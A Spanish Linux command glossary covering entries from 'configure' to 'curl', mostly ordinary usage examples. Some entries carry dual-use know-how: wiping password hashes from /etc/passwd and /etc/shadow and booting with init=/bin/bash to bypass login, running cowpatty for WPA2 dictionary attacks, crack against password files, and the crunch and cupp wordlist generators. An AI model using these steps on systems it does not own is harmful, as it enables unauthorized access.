      $ ./configure --locatestatedir=/var/lib  (donde colocar las librerías)
El make se encarga de leer el makefile donde se indica los archivos a compilar y el orden en el que deben ser compilados. La ejecución de make genera varios archivos necesarios para la compilación y que pueden ser eliminados, ya sea al final del proceso o si este ha de reiniciarse por algún error, con:
$ make clean
Si el archivo makefile no se ha borrado, Una vez instalado el programa, puede eliminarse con:
$ make uninstall
make install instala el paquete en el sistema. Una mejor opción a make install es usar checkinstall, lo cual crea un paquete .deb que constará en el listado de programas instalados con lo que se facilitará su desinstalación ya sea por synaptic o apt-get.


compiz
efectos escritorio.
$ compiz --replace (activar los efectos)
$ metacity --replace (Desactivar los efectos)


composite
[imagemagick]. Mezclar dos imágenes por consola
$ composite -geometry 96x96+250+70 delante.jpg fondo.jpg imagen.jpg
$ composite -dissolve 50 -gravity Center una.png  dos.png salida.png
$ composite -tile una.png dos.png salida.png (Cubre la dos.png con imagenes una.png
$ composite -dissolve 60% una.jpg dos.jpg output (transparencia del 60%)
$ composite -blend 0x0 -gravity south uno.png dos.png -alpha set salida.png (funde dos imagenes en una transparencia completa)
$ composite -blend 0x80 imagen -size 70x46 xc:'#808080' -alpha on salida (controlar la transprencia de una imagen)
$ composite -watermark 20% -gravity SouthWest marca.png imagen salida.png (Poner una marca de agua 20% difuminada abajo a la izquierda)
opciones:
dissolve.- Indica el grado de fusión entre una y otra imagen.
gravity .- Indica dónde se mezclan las imágenes. Valores: SorthWest, North, NorthEast, West, Center, East, SouthWest, South y SouthEast


compress
Comprimir archivos. Substituye el fichero orginal añadiendole .Z. Este comando es el compresor original de Unix. Su algoritmo de compresión es bastante primitivo, pero se mantiene por razones históricas de compatibilidad.
$ compress fichero.txt (Creará fichero.txt.Z)
$ uncompress fichero.txt.Z (Descomprmir)


compton
Agregar transparencias, sombras, marcos... a las ventanas . Todos los parámetros pueden establecerse creando el archivo .compton.conf
$ compton & (Empleará los parámetros por defecto)
$ compton -c (Para aplicar sombras)
$ compton -cC (Que las sombras no afecten a los paneles y docks)
$ compton -cC -i 0.6 -e 0.6 (especificar la transparencia de las ventanas inactivas y los marcos)
$ compton -cC -i 0.6 -e 0.6 -fF (habilitar efectos suaves de transición en ventanas y menús)
$ compton -cC -i 0.6 -e 0.6 -fF -I 0.065 -O 0.065 -D 6 (Especificar tiempo de opacidad al desvanecerse las ventanas)
$ compton -cC -i 0.6 -e 0.6 -fF -I 0.065 -O 0.065 -D 6 -m 0.8 (Especificar la opacidad de los menús)


concalc
Calculadora.
$ concalc 5*3 (Sin especificar números se accede al promt interactivo)


conky
[conky-all lm-sensors hddtemp]. Monitor de sistema. Permite visualizar el estado de la CPU, memoria, espacio de intercambio, de almacenamiento en el disco duro, temperaturas, procesos, interfaces de red, así como el estado de la batería y algunas otras funciones que se le pueden configurar en el archivo ~/.conkyrc
$ cp /etc/conky/conky.conf ~/.conkyrc
$ conky (Arrancar la aplicación. Se muestra en el escritorio)
$ conky -d (arrancarla como daemon)


connman
Utilidad para gestionar las conexiones a Internet y otros servicios de red. Implementa resolución y almacenamiento en caché de DNS, clientes DHCP para IPv4 e IPv6, manejo de direcciones IPv4 locales de enlace y conexión compartida a clientes a través de USB, Ethernet, WiFi, celular y Bluetooth.
$ connmanctl state (verificar el estado actual de las conexiones activas y disponibles)
$ connmanctl enable wifi_0 (activar la interfaz Wi-Fi)
$ connmanctl connect wifi_0 (y luego conectar a una red)
$ connmanctl disconnect wifi_0 (desconectar una red)
$ connmanctl services (muestrae todas las redes disponibles para conectar)
$ connmanctl config wifi_0 --manual --security=none --autoconnect=yes (establece un perfil manual de conexión sin seguridad)
$ connmanctl state wifi_0 (muestra el estado actual de la interfaz Wi-Fi)
$ connmanctl agent on (activa el agente de conexión)
$ connmanctl connect vpn_0 (y luego se conecta a un servicio VPN especifico)


conntrack
Permite replicar el estado de las conexiones que están siendo actualmente procesadas por el firewall. Conntrackd también puede ejecutarse como daemon de estadísticas.
# conntrack -C (Para contar el número total de conexiones de red en este momento)
# conntrack -E -e NEW (monitorear las conexiones de red recién creadas como eventos en tiempo real)
# conntrack -L -p tcp --state ESTABLISHED (mostrar conexiones TCP abiertas)
# conntrack -L -p udp --dport 500 (mostrar conexiones UDP con el puerto de destino 500)
# conntrack -E -e NEW -p tcp --dport 22 (monitorear nuevas conexiones SSH en tiempo real)


conntrackd
Proporciona una interfaz flexible para el sistema de seguimiento de conexiones que /proc/net/ip_conntrack. Puede replicar el estado de las conexiones que actualmente procesa el firewall.
# conntrackd -d (Ejecuta en modo daemon)
# conntrackd -s (volcar las estadísticas recopiladas por el daemon)
# conntrackd -i (Volcar los estados contenidos en la memoria caché interna, es decir, los manejados por este firewall)
# conntrackd -e (Volcar los estados contenidos en la memoria caché externa, es decir, aquellos manejados por otros firewalls)
$ conntrackd -c (convierte la caché interna en el sistema de seguimiento de la conexión del núcleo)
$ conntrackd -k (matar el demonio)
$ conntrackd -s network (muestra las conexiones de red)


consolation
Este paquete es un daemon que proporciona soporte para copiar, pegar y desplazarse en la consola de Linux. Se basa en la biblioteca libinput y admite todos los dispositivos de puntero y configuraciones proporcionadas por esta biblioteca. Una vez instalado, con dos clics del ratón selecciona la palabra sobre la que está el puntero y con 3, toda la linea.
$ systemctl status consolation (comprobar si está activo)


consolochars
Modificar las fuentes en las consolas [tty1-6]
# consolechars -f fuentes
Nota.- Listado en /usr/share/consolefonts , /usr/lib/kbd/consolefonts, /usr/share/kbd/consolefonts según distro


conspy
Acceso a las tty1-6 en local o remoto.
# conspy 1 (entra en la tty1)
Para salir pulsar tres veces seguidas la tecla “Esc”


continue
Salta a la siguiente interacion en un bucle for, select, while o until. En el siguiente ejemplo se imprime del 1 al 5 pero saltándose el 3:
	#!/bin/bash
	for contador in 1 2 3 4 5
	do
		if [ "$contador" -eq 3 ]
		then
			continue
		fi
		echo "$contador"
	done


contraseñas
1.-
Eliminar contraseña de root. Iniciar sesión con un live-cd y montar la partición del discon duro [suponemos /dev/sda2]
	# mount /dev/sda2 /media/sda2
	# gedit /dev/sda2/etc/passwd
Y en la linea: root:x:0:0:root/root:/bin/bash
Borrar la “x”, dejandola asi: root::0:0:root/root:/bin/bash y repetir la operación con el usuario normal.
Reiniciar
Activar  root en gdm [parecido con otros selectores de sesión: lightdm, xdm...]
	# gedit /etc/gdm/gdm.conf
Cambiar la linea:  AllowRoot=false   por AllowRoot=true
	# passwd root
Entrar la contraseña
2.-
Cambiar el tiempo en que el sistema "olvidará" la contraseña después de un sudo:
	# nano /etc/sudoers
Y añadir la línea: Defaults timestamp_timeout = 5
Donde el 5 es el tiempo en minutos que la contraseña será guardada.
3.-
Otra forma para cuando se pierde la contraseña
Entrar con un cd live y visualizar /etc/shadow del sistema instalado y buscar el  usuario. La estructura es parecida a:
pepe:$1$YpVPtTE9$jNPGevJ8IjHyAqh0h04V4.:13277:0:99999:7:::
Borrar lo que sigue al nombre del usuario para que quede:
pepe::13277:0:99999:7:::
de este modo el usuario no tendrá contraseña y cuando se pida, dar al intro.  Tras reiniciar, cuando aparezca el menu de grub, situarse con el cursor en la línea del kernel que se quiera usar. Pulsar 'e' para editar la entrada y editar la línea kernel [pulsando 'e' de nuevo]. Añadir al final de la línea lo siguiente:
init=/bin/bash
Esto hace que el sistema arranque una shell root sin pedir password. Es posible que el teclado esté en inglés. Pulsar 'b' para comenzar el arranque del kernel. La partición raíz suele montarse como sólo lectura, asi que se deberá montar como lectura/escritura:
# mount -o remount,rw /dev/hda2
Por último, cambiar la clave de root ejecutando:
# passwd root
4.-
Establecer norma en el sistema de que la contraseña tenga como nímino 8 caracteres:
# nano /etc/pam.d/common-password
Y dejar la linea:
	password        [success=2 default=ignore]      pam_unix.so obscure sha512 min=8
5.-
Página donde comprobar la fortaleza de una contraseña: <https://howsecureismypassword.net/>


control-
[^c, ^z] Cancelar o suspender la ejecución de comandos en primer plano.
Cancelar:
	$ sleep 5000
	^C
Suspender:
	$ sleep 5000
	^Z
	[1]+  Detenido       sleep 5000
Nota.- En caso de volver a llevar a primer plano un comando detenido:
	$ fg %1
En caso de querer continuar con su ejecución en segundo plano:
	$ bg %1


convert
[imagemagick]. Redimensionar, cambiar formatos, extraer fotogramas, convertir blanco y negro imagenes. Este comando es tan extenso que él solo merecería un libro. Consulta más exhaustiva en <http://www.imagemagick.org/script/convert.php> o en español <http://www.rpublica.net/imagemagick/intro.html#inicio_sec>
$ convert *.jpg imagenes.pdf        (Crear un pdf con todas las imágenes)
$ convert {1,2,3,4,5,6,7,8,9}.png imagenes.pdf (Lo mismo especificando páginas y orden)
$ convert color.jpg -monochrome blanconegro.jpg (Convertir a blanco y negro)
$ convert original.png nueva.jpg        (Cambiar el formato de una imagen)
$ convert --auto-orient in.jpg out.jpg  (Reorientar una foto)
$ convert -resize 800x600 *.jpg %02d.jpg (Cambiar dimensiones de todas)
$ convert -quality 40% imagen image_reducida         (lo mismo)
$ convert -delay 60 1.jpg 2.jpg 3.jpg 123.gif (gif animado con varios jpg)
$ convert -geometry 400 -delay 100 -loop 0 *.JPG resultado.gif (Otra forma de gif animado con varios parámetros)
$ convert -delay 200 -quality 20 -size 200 -loop 0 *.jpg resultado.gif (Otra forma de gif con todas las fotos del directorio)
$ convert 123.gif -adjoin 1-2-3.jpg     (extraer los fotogramas de un gif)
$ convert -resize 200 awk.pdf[0] awk.png (primera imagen pdf a imagen)
$ convert file.pdf file.jpg  (convertir pdf en jpg)
$ convert imagen.png -pointsize 32 -gravity center -annotate 0 "Linux es genial" salida.png (Colocar un texto con medida 32 sin inclinación [-annotate 0] en el centro [-gravity center] de una imagen )
$ convert imagen.jpg -alpha set -channel A -fx 0.5 imagen.png (Aumentar la tranparencia de una imagen [valor de fx: 0 toda y 1 nada] y canviarla a jpg)
$ convert -density 300 input.pdf -fill "rgb(255,255,255)" -opaque "rgb(29,5,114)" output.pdf  (convertir fondo negro a blanco para imprimir)
$ convert entrada.jpg -font Bookman-Demi -pointsize 62 -stroke white -draw "text 5,60 'Texto'" salida.jpg (poner un texto en determinadas coordenadas [5,60] especificando fuente, medida y borde de las letras en blanco)
Si quisieramos el texto en rojo añadiríamos: -fill red después de -stroke white)
Algunas opciones:
	-fill red (Letra roja)
	-strokewidth 3 (Ancho del borde de letra)
	-border 3 (Emmarcar la imagen con un borde de 3 pixels)
	-frame  5x5+2+2 (Lo mismo estilo cuadro)
	"delay 60" (son 60 milisegundos por fotograma)
	"resize 150×150" (Respetará la proporción de la imagen.)
	"imagen%02d" (Renombrará todas la imagenes con nombre "imagen" y dos dígitos.)
	"imagen%03d" (Igual pero con tres dígitos.)
$ ifconfig | convert -background yellow -fill black -font Courier -pointSize 14 label:@- ifconfig.png  (convertir la salida de un comando a imagen png)
	ifconfig (comando que se ejecuta)
	-background (color del fondo)
	-fill (color del texto)
	-font (fuente del texto)
	-pointSize (tamaño del texto)
	label:@- (Nombre del archivo a generar)
Archivos nombre de fuentes, colores: /etc/ImageMagick/
Tambien puede cambiarse el nombre de la fuente por su archivo:
	-font /home/usuario/.fonts/Albert.ttf
1.-
Convertir todas las imágenes del directorio de formato .jpg a .png:
$ for i in *.jpg;do convert "$i" "${i%.jpg}.png";done


cool-retro-term
Emulador de terminal que imita la apariencia de las antiguas pantallas de tubo catódico.
$ cool-retro-term (forma básica)
$ cool-retro-term --fullscreen -e htop (a pantalla completa y comando a ejecutar)


coproc
Inicia un comando en segundo plano configurando tuberías conectadas a su stdin y stdout para que pueda interactuar con él bidireccionalmente.
$ coproc ls


copy
Carpetas en la nube tipo Dropbox. Entrar en <http://www.copy.com> despues de registrarse y logearse, clicar en la pestaña "Install App" con lo que se nos descargará la aplicacion de escritorio.
$ tar -zvxf copy_agent-1.28.0657.tgz
$ cd copy/x86_64/
$ ./CopyAgent --install (Donde pondremos nombre de usuario y contraseña del registro y carpeta a compartir. Por defecto Copy)
$ ./CopyConsole (Forzar actualizaciones)


copyright-update
Actualizar la información de copyright en un conjunto de archivos.
# cd /usr/bin
# copyright-update -t * (test sobre el año del directorio /usr/bin)
# copyright-update -v -r -t * (con más información y de forma recursiva)


corelist
Proporciona información sobre los módulos core y dual-life incluidos en cada versión de perl.
$ corelist -v (enumera todas las versiones de perl)
$ corelist -r (lista todas las versiones de perl y cuándo se publicaron)
$ corelist -a Unicode (lista todas las versiones del módulo dado)
$ corelist --utils -v 5.8.3 (De la version)


cowpatty
Aplicación de ataque de diccionario contra contraseñas WPA2.
$ cowpatty -f diccionario -r ataque.cap -s SSID (lista de palabras a usar, guardar en el archivo expecificado y el SSID encontrado)


cowsay
Muestra figuras en consola
$ cowsay -l      (muestra todas las posibilidades de figuras)
$ cowsay -f tux Esto es linux
$ echo “linux” | cowsay -n | cowsay -n | cowsay -n (Anidando las figuras)


cowsay-off
Esta aplicación aumenta las opciones de cowsay [ver] con una mayor cantidad de criaturas, algunas de las cuales son: ponys, el demonio BSD, dragones, canguros, pavos hasta un elefante o una serpiente.
$ cowsay -l (nuevo listado ampliado de cowsay)
$ cowsay -f vader-koala Esto es linux


cowthink
Vaca pensando.
$ cowthink -p ¿¿Linux??


cp
Copiar archivos
$ cp -r  (Copia archivos y directorios de forma recursiva)
$ cp -i   (Pide confirmacion antes de sobreescribir)
$ cp -f   (Borra el archivo de destino sin preguntar)
$ cp -u  (copia sólo cuando el archivo de origen es más reciente que el archivo de destino o cuando el archivo destino falta)
$ cp -p  (Copiar conservando los permisos de usuario y grupo)
$ cp archivo{,.back} (Hará una copia .back del archivo)
	$ cp archivo archivo.$$ ("$$" es una variable de la shell que contiene el pid)


cpaldjvu
Convierte documentos pdf o imagenes a formato djvu
$ cpaldjvu -colors 5 -dpi 50 -verbose entrada.jpg salida (especificando colores [por defecto 256] y resolución [entre 25 y 6000.Por defecto 300])


cpio
Copiar archivos a un contenedor de manera más eficiente que tar. Los respaldos se pueden restaurar en cualquier sistema UNIX.
$ ls *.txt | cpio -ocv -O archivo.cpio (Creará [-o] "archivo.cpio" [-O] con todos los .txt del directorio, mostrando toda la salida [-v] y que escriba la información del encabezado en ASCII para facilitar el traspaso entre plataformas)
cpio -icv < archivo.cpio (Extraer el contenido)
$ cpio -it < file.cpio > indice (Crear un indice con el contenido de un archivo cpio)
Opciones:
	-u (Sobreescribiendo si al extraer ya existe el fichero ya que sin este parámetro no lo hace)
	-i (extraer archivos de un fichero)
	-t (Desplegar sin extraer)
	-r (Dar nombre a los archivos que se están extrayendo de forma interactiva)
	-d (Extrae con la misma estructura de directorio, si así se creó el fichero)


cpipe
Copia la entrada estándar a la salida estándar mientras mide el tiempo que tarda en leer un búfer de entrada y escribir un búfer de salida. Las estadísticas del promedio de rendimiento y la cantidad total de bytes copiados se imprimen en la salida de error estándar.
# find /usr -iname network | cpipe -vr -vw -vt > /dev/null (mostrar tiempos de lectura, escritura y rendimiento y los demás datos a /dev/null)
	in: 887.446ms at     720B/s (    720B/s avg)     639B   (bsize=639)
	out:   0.002ms at  304.7MB/s ( 304.7MB/s avg)     639B
	thru: 887.496ms at     720B/s (    720B/s avg)     639B


cplay-ng
Reproductor de música minimalista con una interfaz de usuario textual escrita en Python. En lugar de crear una base de datos elaborada de la biblioteca de música, cplay permite explorar el sistema de archivos y poner en cola archivos, directorios y listas de reproducción.
$ cplay-ng


cpu
reemplazo para las utilidades useradd/usermod/userdel para administradores que utilizan un servidor LDAP y que desean tener un conjunto de herramientas de línea de comando para hacer la administración.


cpufreq-info
Obtiene información del estado del demonio cpufreqd así como información de la CPU.
$ cpufreq-info


cpufreq-selector
Permite definir el perfil de la CPU powersave, performance, conservative, userspace, ondemand así como la velocidad y otros parámetros
$ cpufreq-selector -g powersave -c 0 (Define perfil powersave para el nucleo 0)
$ cpufreq-selector -f 1200000 (Define la velocidad exacta de la CPU, en Khz)


cpufreq-set
Define el perfil de la CPU [powersave, performance, conservative, userspace, ondemand] así como la velocidad y otros parámetros
# cpufreq-set --governor powersave (Define el perfil de velocidad de la CPU. Perfiles disponibles: conservative, powersave, performance, ondemand, userspace)
# cpufreq-set -c 0 (Definimos que queremos aplicar el comando a la CPU 0. Si se omite, por defecto tomará este valor. El rango de este valor va de 0 a N-1 CPUs. Por ejemplo con 4 núcleos iria de 0 a 3)
# cpufreq-set --min 1200000 –governor PERFIL (define la velocidad mínima del procesador en Hz para el perfil seleccionado, requiere el uso de la opción --governor. En caso de que el valor sea inferior al permitido, se utiliza la velocidad mínima soportada por la CPU. Si tenemos más de una CPU o núcleo, debemos repetir el comando para cada CPU con la opción -c e indicar el número de esta)
# cpufreq-set --max 2101000 --governor ondemand (lo mismo que –min pero con la velocidad máxima de la CPU)
# cpufreq-set -f 1600000 (Especificamos que queremos que la CPU trabaje a la velocidad deseada. Requiere que estemos usando el perfil userspace)


cpuid
Muestra el IP del proveedor, caracteristicas del procesador, información de caché, etc de procesadores Intel y AMD x86. No tiene opciones.
$ cpuid


cpuinfo
Biblioteca para detectar información del rendimiento de la CPU. Incluye las aplicaciones: cache-info, cpu-info, cpuid-dump y isa-info.
# cache-info
# cpu-info
# cpuid-dump
# isa-info


cpulimit
Limitar el uso de la cpu para determinados procesos.
# cpulimit -e yes -l 20 (el de “yes”a un 20% de la cpu. Valor entre 0 y 100)
# cpulimit -p PID -l 50 (el proceso con el numero PID al 50%)


cpustat
Información periódicamente sobre la utilización de la CPU.
$ cpustat -l (Información extendida)
$ cpustat -p PID (sobre un PID)
$ cpustat -a
$ cpustat -i
$ cpustat -t root (Sobre un usuario)
$ cpustat -n 20 (muestra los 20 procesos principales que se ejecutan en el sistema)


cputool
Limita el uso del CPU de un proceso.
$ cputool -c 50 -p 15352 (Al 50% para el PID 15352)


crack
Programa para localizar vulnerabilidades en archivos de contraseñas escaneando los contenidos y buscando usuarios que hayan elegido una contraseña de inicio de sesión débil.
# crack -nice 10 /etc/passwd (con prioridad reducida para que otros programas tengan prioridad sobre la cpu)


cracklib
(libcrack2) Verifica la fortaleza de una contraseña, procesa archivos de palabras, crea bases de datos, etc. El paqueta contiene varias herramienta: cracklib-chec, cracklib-format, cracklib-packer, cracklib-unpacker y update-cracklib.
Mide la fortaleza de una contraseña.
	$ echo "LinUx_f1nt1stic0" | cracklib-check
	LinUx_f1nt1stic0: OK
	$ echo "linux12" | cracklib-check
	linux12: it is based on a dictionary word
Puede usar el modo interactivo:
	$ cracklib-check
	54321
	54321: it is too short
	linux2
	linux2: it is based on a dictionary word
	HueñPP9-?"HgfR
	HueñPP9-?"HgfR: OK
# update-cracklib (actualizar los diccionarios de la aplicación)
# cracklib-format datos (convierte cada linea en una palabra independiente de las que tenga y las coloca por orden alfabetico)
# cracklib-format datos > datos2 (lo anterior mandándolo a un archivo)


crashme
Aplicación que se basa en una serie de script que escribirán código aleatorio en secciones aleatorias de la memoria para ver qué tal responde el sistema operativo y poder detectar posibles fallos, vulnerabilidad o simplemente comprobar qué tal responde a escrituras forzadas en secciones de la memoria utilizadas. Por defecto los tests de Crashme están limitados a 30 segundos, tras los cuales se cierran y se guardan los registros. Advertencia: Si bien se sabe que el kernel Linux sobrevive días y semanas de crashme, no se garantiza que el sistema sobreviva a varios de estos procesos.
# crashme +2000 666 50 00:02:00 2 (2 minutos de proceso, mostrar información resumida del proceso)


create-cracklib-dict
[cracklib-runtime]. Toma uno o más archivos de listas de palabras como argumentos, una por linea y los convierte en diccionarios de cracklib.
# create-cracklib-dict archivo


cron-apt
Herramienta que ejecuta un trabajo cron a intervalos regulares. Por defecto, solo actualiza la lista de paquetes y descarga nuevos paquetes sin instalar. Puede indicarle que ejecute cualquier cosa que pueda hacer con apt-get o aptitude. Editar el archivo:
# nano /etc/cron-apt.conf
Y modificar las lineas:
	MAILON="always"
	MAILTO="usuario@example.com"
# cron-apt (comprobar que el software se ejecute sin problemas)
Para comprobar los logs en el archivo /var/log/cron-apt/log


cronic
Contenedor para trabajos de Cron. Chronic administra el resultado de otros programas y los organiza para mostrar solo ese resultado si el comando tiene un error o falla. Si el comando tiene éxito, se ocultará cualquier otra salida y eso significa que no habrá correo electrónico. Sólo se recibe un correo electrónico si no funciona. Un ejemo de estilo podria ser:
$ crontab -e
Añadir el script que se ejecutaria, por ejemplo, en cada reinicio:
	@reboot cronic script.sh
Pera comprobar si se ejecuta correctamente podemos realizar una prueba. Modificamos el crontab con un script que no existe:
$ crontab -e
Añadimos:
	@reboot cronic scrit.sh
Recibiremos un correo con algo parecido a "Cron <usuario@localhost> chronic scrit (failed)"


crontab
configurar tareas para que se ejecuten automáticamente en el sistema
# crontab -e      (editar el archivo crontab, si no existe se crea)
$ crontab -e      (idem para el usuario no root)
# crontab -l       (Muestra el contenido para root)
# crontab -l -u usuario  (muestra el de usuario)
$ crontab -l       (idem para el usuario no root)
# crontab -r       (Borra el contenido de crontab)
Crontab consta de 6 campos separados por un espacio que indican:
minuto (0-59), hora (0-23), dia del mes (1-31), mes (1-12), dia de la semana (0-6, domingo=0), y comando a ejecutar. Un asterisco * como valor en los primeros cinco campos, indicará todos (todos los minutos, todas las horas ...)
	01 * * * *       (Se ejecuta el primer minuto de cada hora todos los dias)
	20 9 * * *       (a las 9:20 de la mañana todos los dias)
	20 21 * * *     (a las 9:20 (21:20) de la tarde todos los dias)
	01 6 * * 1      (a las 6:01 de todos los lunes)
	* * 1 1 *         (todos los minutos de todas las horas del 1 de enero)
	00 12 * * 0     (a las doce en punto de todos los domingos)
	@reboot (Cada reinicio)
También es posible especificar listas en los campos:
	01 15 * 1-4 1,2,3,4   (a las 3:01 de la tarde de lunes a viernes de enero a abril)
	*/15 * 1-15 *     (cada 15 minutos  entre el 1 y el 15 de todos los meses)
	*/5 * * * * cp /etc/resolv.conf.bak /etc/resolv.conf  (Ejecutar cada 5 minutos el comando especificado.)
	$ 0 8 * * * env DISPLAY=:0.0 vlc /home/usuario/musica/archivo.mp3 (Programar que cada dia a las 8 se abra un mp3 con el vlc)
El archivo donde se guardan las tareas a realizar es:
$ nano /var/spool/cron/usuario
También pueden añadirse o modificarse en este archivo.
1.-
En ocasiones, y especialmente con Archlinux, crontab cambia la codificación de caracteres de los scripts. Ejecutados directamente funcionan correctamente pero al colocarlos en el cron se muestran con caracteres estraños. La causa son las variables de entorno asociadas a la máquina y al demonio del cron. Para solucionar el problema:
# nano /etc/environment
Y añadir la linea:
LANG=es_ES.UTF-8
Reiniciar cron:
# /etc/rc.d/crond restart
2.-
Una forma de controlar si un script colocado en el cron funciona correctamente es:
$ env -i /home/user/script.sh
La condición de ejecución es similar a como lo hace cron.


cruft
Lista ficheros que presumiblemente sobran, faltan o están de alguna forma incorrectos, tomando principalmente la información de la base de datos de dpkg
# cruft -d /var/www
# cruft -r (Mostrar el informe)
# cruft --ignore /home/usuario (Descartando un directorio)


crunch
Generador de listas de palabras. Puede especificarse un conjunto de caracteres y admite números, símbolos, mayúsculas, minúsculas, caracteres por separado y Unicode.
$ crunch 6 6 0123456789abcdef -o 6caracteres.txt (generar palabras de un mínimo de 6 caracteres y máximo de 6 usando los especificados y guardandolo el el archivo menionado)
$ crunch 3 5 ABC$%& -o caracteres.txt (mínimo de 3 y máximo de 5 usando los epecificados)
$ crunch 4 5 -p mormo dama .com (usando permitaciónes de palabras especificadas.)


cryfs
Cifra archivos para que puedan almacenarse de forma segura en cualquier lugar. Funciona bien junto con servicios en la nube como Dropbox, iCloud, OneDrive y otros
# cryfs --show-ciphers (cifrados disponibles)
# cryfs archivo_a_cifrar archivo_descifrado (forma básica)


cryptmount
Utilidad para crear sistemas de archivos cifrados y que permite a un usuario común montar/desmontar sistemas de archivos sin requerir privilegios de superusuario.
# cryptmount-setup (configurar Cryptmount y crear un sistema de archivos encriptado )
$ cryptmount dir-secreto (acceder al dir cifrado. Pedirá contraseña)
$ cryptmount -u dir-seccreto (desmontar el dir cifrado)
$ cryptmount -l (listar todos los directorios cifrados)
$ cryptmount -c dir-secreto (cambiar la contraseña del dior cifrado)


cryptsetup
Cifrar con LUKS una partición. LUKS especifica un formato estándar en disco, independiente de plataforma.
# cryptsetup -y -v luksFormat /dev/sda3 (Pregunta la contraseña y confirmación para cifrar la partición. Borra todos los datos existentes [y] y modo verbose)
# cryptsetup luksOpen /dev/sda3 backup (Desencriptar. Inprescindible darle un nombre para el mapeo [backup])
Una vez entrada la contraseña asignada en el primer paso, escoger el formato según sistema [mkfs.vfat para fat32 o mkfs.ntfs para NTFS]:
# mkfs.ext4 /dev/mapper/backup -L cripta (con el nombre "cripta")
# cryptsetup luksClose backup (Cerrar la partición)
# cryptsetup -v status backup (ver el estado de la asignación)


csplit
Dividir un archivo en varios archivos.
$ csplit -f seccion archivo.txt /capitulo/ {*} (que cada uno use el sufijo "capitulo" [capitulo00, capitulo01...],  que la division se produzca cuando encuentre la palabra "capitulo" y que haga todas las divisiones que precise)
$ csplit -n 4 archivo.txt 4 (El sufijo por defecto [xx] y que use 4 dígitos [xx0001, xx0002...] y parta en 4 archivos)
$ csplit -b %03d archivo.txt 3 (lo mismo con 3 dígitos y parta en 3 archivos [xx001, xx002...])
$ csplit archivo.txt 5 -f parte (Dividir en 5 archivos y cada uno con el sufijo "parte" [parte00, parte01...])
Nota.- para unirlo usar:
$ cat parte[0-5] > completo.txt


csscapture
[python-cssutils]. Capturar el css de una web.
$ csscapture -s web http://www.tuxapuntes.com (guarda en la carpeta “web”)


cupp
Herramienta que puede generar un diccionario para ataques de fuerza bruta o ataques de diccionario con una lista de palabras a partir de información como un cumpleaños, apodo, dirección, nombre de una mascota o familiar, o una palabra común.
$ cupp3 -i (Realiza varias preguntas sobre cual es el nombre, el nik, el hijo... y al final creau un diccionario con los datos entrados .txt)
$ cupp3 -l (bajar el diccionario del idioma que se entre)


cups
Gestión de impresoras.
# cupsenable Hewlett-Packard-HP-LaserJet-Professional-P1606dn (Activar una impresora)
1.-
Montar una impresora en red:
En la máquina servidor (la que tiene conectada la impresora)
	# nano /etc/cups/cupsd.conf
Comentar la linea “Listen localhost:631” y añadir la ip de la máquina: “Listen 192.168.2.3:631” y en el siguiente apartado añadir los parámetros de la red:
	# Restrict access to the server…
	<Location />
		Order allow,deny
		Allow localhost
		Allow @LOCAL
		# permisos a la red local
		Allow from 192.168.2.0/24
	</Location>
Para activar la compartición de impresoras:
     Browsing on
     # /etc/init.d/cupsd restart (reiniciar cups)
Abrir el navegador y poner http://localhost:631 después del logeo ir a la pestaña printers y seleccionar la impresora, con lo que nos quedará en la barra de navegación algo parecido a:         http://localhost:631/printers/PSC-1100
Que sustituyendo “localhost” por la dirección ip de la máquina nos dará la dirección de la impresora:
http://192.168.2.3:631/printers/PSC-1100
En las máquinas cliente
	# nano /etc/cups/cupsd.conf
Browsing on
BrowseAllow 192.168.2.0/24
	# /etc/init.d/cupsys restart
Y configurar la impresora de la forma habitual ya sea en Sistema -> administración -> impresoras pestaña Configuración -> URI del dispositivo y poner la dirección de la impresora o via http://localhost:631
2.-
Que se muestre el nombre de usuario que imprime cada trabajo:
# nano /etc/cups/cupsd.conf
Substituir:
	JobPrivateValues default
Por:
	JobPrivateValues none


cupsaccept
Que una impresora acepte trabajos.
$ cupsaccept nombre_impresora


cupsdisable
Desactivar impresoras.
$ cupsdisable nombre_impresora


cupsenable
Activar impresoras.
$ cupsenable nombre_impresora


cupsreject
Que la impresora deje de aceptar trabajos.
$ cupsreject nombre_impresora


curl
Herramienta para la transferencia de datos desde o hacia un servidor. Permite los protocolos ftp, https, sftp, scp, tftp ...
$ curl ftp://host (Sin ninguna opción obtiene la páquina principal del host [http, ftp...)
$ curl ftp://host/ http://host/ (Descargar dos host simultaneos)
$ curl -o destino http://host (Guarda el host en destino)
$ curl -i URL (información sobre una URL)
$ curl -I URL (extraer todas las cabeceras)
$ curl -o portada.png http://www.lapipaplena.net/wp-content/uploads/2012/08/meditate1.png (descargar una imagen y guardarla)
$ curl -u usuario:contraseña http://localhost/restringido/ (Acceder a una zona que requiera autentificación)
$ curl ftp://usuario:contraseña@host:puerto/home/usuario/archivo (Otra forma de autentificación)
$ curl -T archivo_local ftp://host/carpeta (Subir un archivo local a un host remoto)
$ curl -T archivo_local -a ftp://host/ (Subir un archivo local a un host remoto con el parámetro -a)
$ curl -x proxy:8889 ftp://host (Obtener un host utilizando un proxy)
$ curl -u usuario:contraseña -x proxy:8888 http://host (Usando proxy y con autentificación)
$ curl -U usuario:contraseña -x proxy:8888 http://host (Cuando el proxy requiere autentificación especial)
$ curl -r 0-99 http://host (Obtener los primeros 100 bytes del documento)
$ curl -r -500 http://host (Obtener los últimos 500 bytes del documento)
$ curl --proxytunnel -x proxy:8888 -T archivo_local ftp ftp://host (Usando un tunel)
$ curl -v ftp://host (Ver información que se envia y recibe pero no los datos reales)
$ curl --trace trace.txt host (Obtener más información y guardar en trace.txt)
$ curl --dump-header headers.txt host (Guardar las cabeceras [cookies] en headers.txt)
$ curl -b headers.txt www.example.com (Pasar las cabeceras obtenidas a un host)
$ curl -e www.bueno.com http://host/ (Intentar engañar un site con una dirección falsa)
$ curl -A 'Mozilla/3.0 (Win95; I)' http://host (Intentar engañar un site especificando otro navegador)
$ curl --limit-rate 10K host (Limitar la velocidad de transferencia a 10 kilobytes)
$ curl -P 192.168.0.10 ftp host (Acceder a un host a partir de una ip a la que si tenemos acceso)
$ curl -C - -o descarga hots (Proseguir una descarga interrumpida)
$ curl -z local.html hots/remote.html (Sólo se efectuará la descarga si remote.html es más reciente que local.html)
Otras opciones:
$ curl -Is google.com | grep Date (Conocer la fecha via web)
$ curl ipinfo.io/183.61.164.202 (Conocer datos de una ip)
$ curl icanhazip.com (Conocer la IP externa)
$ curl ifconfig.me (lo mismo)
